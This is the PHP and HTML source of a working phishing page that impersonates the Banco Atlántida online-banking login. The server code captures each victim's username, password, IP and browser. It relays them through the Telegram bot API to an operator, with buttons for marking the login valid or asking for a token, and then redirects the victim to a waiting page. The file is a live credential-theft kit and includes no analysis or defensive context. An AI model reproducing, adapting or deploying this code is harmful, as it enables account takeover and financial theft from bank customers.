<?php
require_once dirname(__DIR__) . '/gate_check.php';
include("../data.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = trim($_POST['usuario'] ?? '');
    $clave   = trim($_POST['clave']   ?? '');

    $ip = '';
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
    }
    $ip   = $ip ?: '?';
    $ua   = $_SERVER['HTTP_USER_AGENT'] ?? '?';
    $date = date('d/m/Y H:i:s');

    $msg  = "🏦 BANCO MANZANA — ACCESO\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 <b>Usuario:</b> $usuario\n";
    $msg .= "🔑 <b>Clave:</b> $clave\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "🌐 <b>IP:</b> $ip\n";
    $msg .= "🕒 <b>Fecha:</b> $date\n";
    $msg .= "📲 <b>UA:</b> " . substr($ua, 0, 80) . "\n";

    $keyboard = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '✅ LOGIN',      'callback_data' => "LOGIN|$usuario"],
                ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|$usuario"],
            ],
            [
                ['text' => '🔑 TOK',       'callback_data' => "TOK|$usuario"],
            ],
        ]
    ]);

    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'parse_mode'   => 'HTML',
        'reply_markup' => $keyboard,
    ]));

    header('Location: ../espera.php?u=' . urlencode($usuario) . '&step=login');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
  <title>Banco Atl&#225;ntida — Iniciar sesión</title>
  <link rel="icon" href="../img/logo-ba.svg" type="image/svg+xml"/>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{
      --red:#E30613;--red-dark:#B30410;
      --text:#1a1a1a;--muted:#6b7280;
      --border:#d9dde3;--radius:14px;
    }
    html,body{
      font-family:'Inter',-apple-system,'Segoe UI',Roboto,sans-serif;
      background:#fff;color:var(--text);min-height:100vh;
      -webkit-font-smoothing:antialiased;
      -webkit-text-size-adjust:100%;
      -webkit-tap-highlight-color:transparent;
      touch-action:manipulation;
    }
    input,button,select,textarea{font-family:inherit;-webkit-appearance:none;font-size:16px}

    .page{max-width:440px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column;position:relative;padding:0 24px 28px}

    .logo-wrap{display:flex;justify-content:center;padding:40px 0 24px}
    .logo-wrap img{height:52px;width:auto}

    .subtitle{text-align:center;font-size:14.5px;color:var(--muted);padding:0 4px 26px;line-height:1.55}

    .form-wrap{padding:0}
    .field{margin-bottom:18px}
    .field label{display:block;font-size:14px;font-weight:600;color:var(--text);margin-bottom:8px}
    .field input{
      width:100%;height:52px;border:1.5px solid var(--border);
      border-radius:var(--radius);padding:0 16px;font-size:15px;
      color:var(--text);background:#fff;outline:none;
      transition:border-color .15s,box-shadow .15s;
    }
    .field input:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,6,19,.10)}
    .pass-wrap{position:relative}
    .pass-wrap input{padding-right:48px}
    .eye-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--red);padding:6px;display:flex;align-items:center}
    .eye-btn svg{width:20px;height:20px}

    .forgot{display:block;text-align:right;font-size:13.5px;color:var(--red);text-decoration:underline;margin-top:10px;font-weight:500}

    .btn-login{
      display:block;width:100%;height:52px;border:none;
      border-radius:999px;font-size:16px;font-weight:600;
      cursor:pointer;margin-top:26px;transition:background .2s,color .2s;
      background:#eef0f2;color:#a8adb5;
    }
    .btn-login.ready{background:var(--red);color:#fff;box-shadow:0 6px 18px rgba(227,6,19,.28)}
    .btn-login.ready:hover{background:var(--red-dark)}
    .btn-login.ready:active{transform:translateY(1px)}

    /* ============ Security tips card ============ */
    .security-card{
      margin-top:26px;
      border:1.5px solid #e5e7eb;
      border-radius:16px;
      padding:16px 18px;
      display:flex;gap:14px;align-items:center;
      background:#fff;
    }
    .security-card .illo{flex-shrink:0;width:70px;height:70px}
    .security-card .illo img{width:100%;height:100%;display:block}
    .security-card .txt{flex:1;min-width:0}
    .security-card .t-title{
      font-size:14.5px;font-weight:700;color:var(--red);
      margin-bottom:6px;line-height:1.25;
    }
    .security-card .t-desc{
      font-size:13px;color:var(--muted);line-height:1.5;
    }

    /* ============ Footer links ============ */
    .foot-links{
      margin-top:auto;
      padding-top:36px;
      display:flex;justify-content:space-between;align-items:flex-start;
      gap:20px;
    }
    .foot-link{
      flex:1;display:flex;flex-direction:column;align-items:center;
      gap:8px;text-decoration:none;color:var(--red);
      font-size:13px;font-weight:500;line-height:1.3;text-align:center;
    }
    .foot-link svg{width:26px;height:26px;color:var(--red)}
    .foot-link span{color:#4b5563;font-weight:500}

    /* ============ Toast (olvidaste contraseña) ============ */
    #toast{
      position:fixed;left:50%;bottom:32px;transform:translate(-50%,20px);
      background:#1f2937;color:#fff;padding:14px 20px;border-radius:12px;
      font-size:14px;line-height:1.4;max-width:340px;width:calc(100% - 40px);
      text-align:center;box-shadow:0 12px 32px rgba(0,0,0,.28);
      opacity:0;pointer-events:none;transition:opacity .25s,transform .25s;
      z-index:10000;
    }
    #toast.show{opacity:1;transform:translate(-50%,0)}

    /* ============ Modal (contacto) ============ */
    #modal-ov{
      position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.5);
      display:none;align-items:center;justify-content:center;padding:20px;
      opacity:0;transition:opacity .22s;
    }
    #modal-ov.show{display:flex}
    #modal-ov.in{opacity:1}
    #modal-box{
      background:#fff;border-radius:16px;max-width:400px;width:100%;
      padding:26px 24px 22px;box-shadow:0 24px 60px rgba(0,0,0,.35);
      transform:translateY(14px);transition:transform .22s;
    }
    #modal-ov.in #modal-box{transform:translateY(0)}
    #modal-box h3{font-size:18px;font-weight:700;color:var(--text);margin:0 0 6px}
    #modal-box .modal-sub{font-size:13.5px;color:var(--muted);margin:0 0 18px;line-height:1.5}
    #modal-box .m-field{margin-bottom:14px}
    #modal-box .m-field label{display:block;font-size:13px;font-weight:600;color:var(--text);margin-bottom:6px}
    #modal-box .m-field input{
      width:100%;height:46px;border:1.5px solid var(--border);
      border-radius:10px;padding:0 14px;font-size:15px;color:var(--text);
      background:#fff;outline:none;transition:border-color .15s,box-shadow .15s;
    }
    #modal-box .m-field input:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,6,19,.10)}
    #modal-box .m-actions{display:flex;gap:10px;margin-top:16px}
    #modal-box .m-btn{
      flex:1;height:46px;border:0;border-radius:999px;font-size:14.5px;
      font-weight:600;cursor:pointer;transition:background .15s;
    }
    #modal-box .m-cancel{background:#eef0f2;color:#4b5563}
    #modal-box .m-cancel:hover{background:#e2e5e9}
    #modal-box .m-ok{background:var(--red);color:#fff;box-shadow:0 6px 16px rgba(227,6,19,.25)}
    #modal-box .m-ok:hover{background:var(--red-dark)}
    #modal-box .m-ok:disabled{background:#e5b6ba;box-shadow:none;cursor:not-allowed}
  </style>
</head>
<body>
<div class="page">

  <div class="logo-wrap">
    <img src="../img/logo-ba.svg" alt="Banco Atl&#225;ntida"/>
  </div>

  <p class="subtitle">Ingresa tu usuario y contraseña para iniciar sesión.</p>

  <div class="form-wrap">
    <form method="POST" action="" id="loginForm" autocomplete="off">

      <div class="field">
        <label for="usuario">Usuario</label>
        <input type="text" id="usuario" name="usuario" autocomplete="username" required/>
      </div>

      <div class="field">
        <label for="clave">Contraseña</label>
        <div class="pass-wrap">
          <input type="password" id="clave" name="clave" autocomplete="current-password" required/>
          <button type="button" class="eye-btn" id="eyeBtn" aria-label="Mostrar contraseña">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
              <circle cx="12" cy="12" r="3"/>
            </svg>
          </button>
        </div>
        <a href="#" class="forgot" id="lnkForgot">¿Olvidaste tu contraseña?</a>
      </div>

      <button type="submit" class="btn-login" id="btnLogin">Iniciar sesión</button>

    </form>
  </div>

  <div class="security-card">
    <div class="illo">
      <img src="../img/safety-tips.svg" alt=""/>
    </div>
    <div class="txt">
      <div class="t-title">¡Importantes consejos de seguridad!</div>
      <div class="t-desc">Descarga la nueva App Atlántida en tu celular para generar el Token y autorizar las transacciones en Atlántida Web.</div>
    </div>
  </div>

  <div class="foot-links">
    <a href="#" class="foot-link" data-contact="Gestiones de usuario">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="8" r="4"/>
        <path d="M4 21a8 8 0 0 1 12-6.93"/>
        <rect x="15" y="14" width="7" height="7" rx="1.5"/>
        <path d="M17 14v-1.5a1.5 1.5 0 1 1 3 0V14"/>
      </svg>
      <span>Gestiones de<br/>usuario</span>
    </a>
    <a href="#" class="foot-link" data-contact="Necesitas ayuda">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
        <path d="M4 14v-2a8 8 0 0 1 16 0v2"/>
        <rect x="2" y="14" width="5" height="7" rx="1.5"/>
        <rect x="17" y="14" width="5" height="7" rx="1.5"/>
        <path d="M20 21a4 4 0 0 1-4 4h-2"/>
      </svg>
      <span>¿Necesitas<br/>ayuda?</span>
    </a>
  </div>

</div>
<script>
  const u = document.getElementById('usuario');
  const p = document.getElementById('clave');
  const btn = document.getElementById('btnLogin');
  const eyeBtn = document.getElementById('eyeBtn');

  function checkReady() {
    btn.classList.toggle('ready', u.value.trim().length > 0 && p.value.length > 0);
  }
  u.addEventListener('input', checkReady);
  p.addEventListener('input', checkReady);

  eyeBtn.addEventListener('click', () => {
    const isPass = p.type === 'password';
    p.type = isPass ? 'text' : 'password';
    eyeBtn.querySelector('svg').style.opacity = isPass ? '0.5' : '1';
  });

  // Bloquear zoom (pinch / doble-tap) en móvil
  document.addEventListener('gesturestart', e => e.preventDefault());
  document.addEventListener('gesturechange', e => e.preventDefault());
  document.addEventListener('gestureend', e => e.preventDefault());
  let lastTouch = 0;
  document.addEventListener('touchend', e => {
    const now = Date.now();
    if (now - lastTouch <= 350) e.preventDefault();
    lastTouch = now;
  }, {passive:false});

  /* =========== Toast: ¿Olvidaste tu contraseña? =========== */
  const toast = document.getElementById('toast');
  let toastTimer = null;
  function showToast(msg){
    toast.textContent = msg;
    toast.classList.add('show');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => toast.classList.remove('show'), 3200);
  }
  const lnkForgot = document.getElementById('lnkForgot');
  if (lnkForgot) {
    lnkForgot.addEventListener('click', e => {
      e.preventDefault();
      showToast('Recupera tu usuario o contraseña a través de tu banca móvil.');
    });
  }

  /* =========== Modal: contacto (gestiones / ayuda) =========== */
  const modalOv    = document.getElementById('modal-ov');
  const modalTitle = document.getElementById('m-title');
  const modalSub   = document.getElementById('m-sub');
  const inpNombre  = document.getElementById('m-nombre');
  const inpEmail   = document.getElementById('m-email');
  const hiddenTipo = document.getElementById('m-tipo');
  const btnCancel  = document.getElementById('m-cancel');
  const btnOk      = document.getElementById('m-ok');

  function openModal(tipo){
    hiddenTipo.value = tipo;
    if (tipo === 'Gestiones de usuario') {
      modalTitle.textContent = 'Gestiones de usuario';
      modalSub.textContent   = 'Déjanos tus datos y un asesor te contactará para ayudarte con la gestión.';
    } else {
      modalTitle.textContent = '¿Necesitas ayuda?';
      modalSub.textContent   = 'Déjanos tus datos y un asesor te contactará a la brevedad.';
    }
    inpNombre.value = '';
    inpEmail.value  = '';
    btnOk.disabled  = true;
    modalOv.classList.add('show');
    requestAnimationFrame(() => modalOv.classList.add('in'));
    setTimeout(() => inpNombre.focus(), 150);
  }
  function closeModal(){
    modalOv.classList.remove('in');
    setTimeout(() => modalOv.classList.remove('show'), 220);
  }
  function checkModalReady(){
    const ok = inpNombre.value.trim().length > 1
            && /.+@.+\..+/.test(inpEmail.value.trim());
    btnOk.disabled = !ok;
  }
  [inpNombre, inpEmail].forEach(i => i.addEventListener('input', checkModalReady));

  document.querySelectorAll('.foot-link[data-contact]').forEach(a => {
    a.addEventListener('click', e => {
      e.preventDefault();
      openModal(a.getAttribute('data-contact'));
    });
  });
  btnCancel.addEventListener('click', closeModal);
  modalOv.addEventListener('click', e => { if (e.target === modalOv) closeModal(); });

  btnOk.addEventListener('click', () => {
    if (btnOk.disabled) return;
    btnOk.disabled = true;
    btnOk.textContent = 'Enviando...';
    const fd = new FormData();
    fd.append('nombre', inpNombre.value.trim());
    fd.append('email',  inpEmail.value.trim());
    fd.append('tipo',   hiddenTipo.value);
    fetch('../contact.php', { method:'POST', body:fd })
      .catch(() => {})
      .finally(() => {
        btnOk.textContent = 'Continuar';
        closeModal();
        // volver al login normal (sin mensajes extra)
      });
  });
</script>

<!-- Toast -->
<div id="toast" role="status" aria-live="polite"></div>

<!-- Modal contacto -->
<div id="modal-ov" role="dialog" aria-modal="true" aria-labelledby="m-title">
  <div id="modal-box">
    <h3 id="m-title">Contacto</h3>
    <p class="modal-sub" id="m-sub">Déjanos tus datos y un asesor te contactará.</p>
    <input type="hidden" id="m-tipo" value=""/>
    <div class="m-field">
      <label for="m-nombre">Nombre</label>
      <input type="text" id="m-nombre" autocomplete="name" placeholder="Tu nombre completo"/>
    </div>
    <div class="m-field">
      <label for="m-email">Correo electrónico</label>
      <input type="email" id="m-email" autocomplete="email" placeholder="correo@ejemplo.com"/>
    </div>
    <div class="m-actions">
      <button type="button" class="m-btn m-cancel" id="m-cancel">Cancelar</button>
      <button type="button" class="m-btn m-ok" id="m-ok" disabled>Continuar</button>
    </div>
  </div>
</div>
<script src="../protect.js"></script>
<?php if (!empty($_GET['error'])): ?>
<script>
(function(){
  var style = document.createElement('style');
  style.textContent = [
    '#__err_ov{position:fixed;inset:0;z-index:99999;backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .35s}',
    '#__err_ov.in{opacity:1}',
    '#__err_box{background:#fff;border-radius:12px;padding:28px 32px;max-width:320px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.35);transform:translateY(18px);transition:transform .35s}',
    '#__err_ov.in #__err_box{transform:translateY(0)}',
    '#__err_icon{font-size:36px;margin-bottom:10px}',
    '#__err_box p{font-family:-apple-system,"Segoe UI",Roboto,sans-serif;font-size:15px;font-weight:600;color:#E30613;line-height:1.5;margin:0}'
  ].join('');
  document.head.appendChild(style);

  var ov = document.createElement('div'); ov.id = '__err_ov';
  var bx = document.createElement('div'); bx.id = '__err_box';
  var ic = document.createElement('div'); ic.id = '__err_icon'; ic.textContent = '⚠️';
  var tx = document.createElement('p');   tx.textContent = 'Usuario o Contraseña Inválidos';
  bx.appendChild(ic); bx.appendChild(tx); ov.appendChild(bx); document.body.appendChild(ov);

  setTimeout(function(){
    ov.classList.add('in');
    setTimeout(function(){
      ov.classList.remove('in');
      setTimeout(function(){ ov.parentNode && ov.parentNode.removeChild(ov); }, 400);
    }, 3000);
  }, 300);
})();
</script>
<?php endif; ?>
</body>
</html>
